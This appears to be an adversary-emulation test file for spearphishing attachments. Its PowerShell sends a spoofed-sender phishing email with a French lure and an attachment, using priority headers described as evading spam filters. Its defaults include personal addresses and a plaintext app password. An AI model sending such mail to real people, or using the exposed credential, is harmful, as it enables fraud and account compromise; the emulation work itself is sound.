attack_technique: T1566.001
display_name: 'Phishing: Spearphishing Attachment'
atomic_tests:
  - name: Simulate sending a phishing email with a malicious attachment via SMTP
    auto_generated_guid: custom-guid-phishing-attachment
    description: |
      This test simulates sending a phishing email with a malicious attachment using PowerShell.
      WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
    supported_platforms:
      - windows
    input_arguments:
      smtp_server:
        description: Serveur SMTP √† utiliser
        type: string
        default: "smtp.gmail.com"
      smtp_port:
        description: Port SMTP
        type: integer
        default: 587  # Port TLS
      sender_email:
        description: Adresse e-mail r√©elle pour l'authentification SMTP
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Remplacez par une adresse Gmail valide
      sender_visible_email:
        description: Adresse e-mail visible dans le champ "From"
        type: string
        default: "chaymabouattour1@gmail.com"  # Utilisez un domaine similaire √† celui de l'entreprise cible
      recipient_email:
        description: Adresse e-mail du destinataire
        type: string
        default: "oumaymakabadou2@gmail.com"  # Remplacez par une adresse email r√©elle
      subject:
        description: Objet personnalis√© de l'e-mail
        type: string
        default: "‚ö†Ô∏è Action requise : Votre compte n√©cessite une mise √† jour"
      body:
        description: Corps personnalis√© de l'e-mail
        type: string
        default: |
          Bonjour [Nom],

          Nous avons remarqu√© une activit√© inhabituelle sur votre compte. Pour prot√©ger vos donn√©es, veuillez t√©l√©charger et consulter le document s√©curis√© ci-joint.

          Merci de votre coop√©ration.
          Cordialement,
          L'√©quipe de s√©curit√©

          Contact : +1 123-456-7890
          Site web : https://exemple.com
      attachment_path:
        description: Chemin vers la pi√®ce jointe (g√©n√©r√©e par T1027)
        type: string
        default: "C:\\temp\\CompressedAttachment.zip.txt"  # R√©f√©rence dynamique au fichier g√©n√©r√© par T1027
      app_password:
        description: Mot de passe d'application pour l'authentification SMTP
        type: string
        default: "wbae yozc iyut rykk"  # Mot de passe d'application g√©n√©r√©
      malicious_link:
        description: URL malveillante masqu√©e
        type: string
        default: "https://secure-documents.exemple.com"  # Remplacez par une URL fictive
      custom_headers:
        description: En-t√™tes personnalis√©s pour √©chapper aux filtres anti-spam
        type: string
        default: |
          X-Priority: 1
          X-MSMail-Priority: High
          Importance: High
      log_file:
        description: Chemin vers le fichier de journalisation
        type: string
        default: "C:\\temp\\phishing_logs.txt"
    executor:
      name: powershell
      elevation_required: false
      command: |
        $smtpServer = "#{smtp_server}"
        $smtpPort = "#{smtp_port}"
        $senderEmail = "#{sender_email}"  # Adresse r√©elle pour authentification
        $senderVisibleEmail = "#{sender_visible_email}"  # Adresse visible dans le champ "From"
        $recipientEmail = "#{recipient_email}"
        $subject = "#{subject}"
        $body = "#{body}"
        $attachmentPath = "#{attachment_path}"
        $securePassword = ConvertTo-SecureString "#{app_password}" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)

        $headers = @{
            "X-Priority" = "1"
            "X-MSMail-Priority" = "High"
            "Importance" = "High"
        }

        Write-Host "üìß Envoi d'un email r√©el via SMTP..."
        try {
            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl `
                -From $senderVisibleEmail -To $recipientEmail `
                -Subject $subject -BodyAsHtml $body `
                -Attachments $attachmentPath -Credential $credential -Headers $headers -ErrorAction Stop
            Write-Host "‚úÖ Email envoy√© avec succ√®s."

            $logEntry = "Email envoy√© √† $recipientEmail avec succ√®s le $(Get-Date)"
            Add-Content -Path "#{log_file}" -Value $logEntry
        } catch {
            Write-Host "‚ùå Erreur lors de l'envoi de l'email : $_"
            exit 1
        }
